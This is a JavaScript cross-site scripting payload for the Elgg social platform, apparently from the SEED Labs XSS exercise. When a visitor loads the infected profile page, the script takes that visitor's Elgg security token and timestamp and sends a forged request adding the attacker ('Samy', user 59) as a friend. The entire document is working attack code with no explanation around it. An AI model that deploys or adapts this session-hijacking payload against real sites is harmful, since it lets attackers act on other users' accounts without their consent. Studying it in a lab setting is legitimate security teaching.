<script type="text/javascript">
    window.onload = function () {   
        var Ajax=null;
        var ts = elgg.security.token.__elgg_ts; // Time Stamp
        var token= elgg.security.token.__elgg_token; // Security Token
        var myID = 59; // User ID of the attacker (Samy)
        var userID = elgg.session.user.guid; // ID of the visitor

        // If Samy is visiting his own profile, no attack should happen
        if (userID == myID) return;

        var sendurl = `/action/friends/add?friend=${myID}&__elgg_ts=${ts}&__elgg_token=${token}&__elgg_ts=${ts}&__elgg_token=${token}`;        

        //Create and send Ajax request to add friend
        Ajax = new XMLHttpRequest();
        Ajax.open("GET", sendurl, true); // last boolean value is for asynchronous request making
        Ajax.setRequestHeader("Host", "www.seed-server.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send();
	}
</script>